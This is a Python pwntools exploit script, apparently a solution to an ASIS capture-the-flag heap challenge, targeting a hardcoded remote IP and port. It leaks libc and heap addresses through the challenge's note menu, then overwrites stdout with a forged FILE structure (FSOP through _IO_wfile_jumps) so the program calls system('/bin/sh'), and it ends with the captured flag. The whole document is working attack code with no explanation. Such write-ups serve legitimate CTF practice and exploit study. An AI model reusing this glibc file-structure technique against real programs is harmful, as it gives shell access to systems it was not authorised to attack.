#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
continue
'''

def one_gadget(filename, base_addr=0):
	  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
#onegadgets = one_gadget('libc.so.6', libc.address)


def start():
    if args.REMOTE:
        return remote("65.109.190.95", 10110)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return r.recvuntil(d2,drop=True)
index = 0

def add(title, size, data):
    global index
    sl(b"1")
    sa(b":", title)
    sla(b":", str(size).encode('ascii'))
    sa(b":", data)
    index += 1
    r.recvuntil(b">")
    return index - 1

def delete(idx):
    sl(b"2")
    sa(b":", str(idx).encode('ascii'))
    r.recvuntil(b">")
    
def modify(idx,size,data):
    sl(b"3")
    sa(b":", str(idx).encode('ascii'))
    sa(b":", str(size).encode('ascii'))
    sla(b":", data)
    r.recvuntil(b">")

def view(idx):
    sl(b"4")
    sa(b":", str(idx).encode('ascii'))

#========= exploit here ===================
r.timeout = 1
r.recvuntil(b">")

a = add(b"A", 0x38, b"B")

delete(0)
#a = 0
add(b"XXXX",0x500, b"YYYY")
d= add(b"A", 0x38, b"B")

delete(0)
add(b"Z", 0x18, b"R")

view(0)
leak = u64(rcu(b"Content: ", b"\n").ljust(8,b"\x00"))
r.recvuntil(b">")
logleak("libc leak", leak)
libc.address = leak - 0x203f52
logbase()
#reset
delete(0)
add(b"Z", 0x18, b"R"*0x10)
view(0)
leak = u64(rcu(b"Content: RRRRRRRRRRRRRRRR", b"\n").ljust(8,b"\x00"))
r.recvuntil(b">")
logleak("heap leak", leak)
heap = leak - 0x310
logleak("heap", heap)

# FSOP
gadget = libc.address +  0x00000000001724f0
logleak("gadget", gadget)

stdout_lock = libc.address + 0x205710
logleak("stdout_lock", stdout_lock)

stdout = libc.sym._IO_2_1_stdout_
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18

pause()
fake = FileStructure(0)
fake.flags = 0x0
fake._IO_read_end = libc.sym.system
fake._IO_save_base = p64(gadget)
fake._IO_write_end=u64(b'/bin/sh\x00')
fake._lock = stdout_lock
fake._codecvt = stdout + 0xb8
fake._wide_data = stdout+0x200
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)


modify(-3, 0x18, b"YYYYYYYY"+p64(0x500))

modify(-2, 0x4ff, bytes(fake))

#========= interactive ====================
r.interactive()
#ASIS{Sometimes_Y0u_should_take_A_look_at_the_PAST!!!}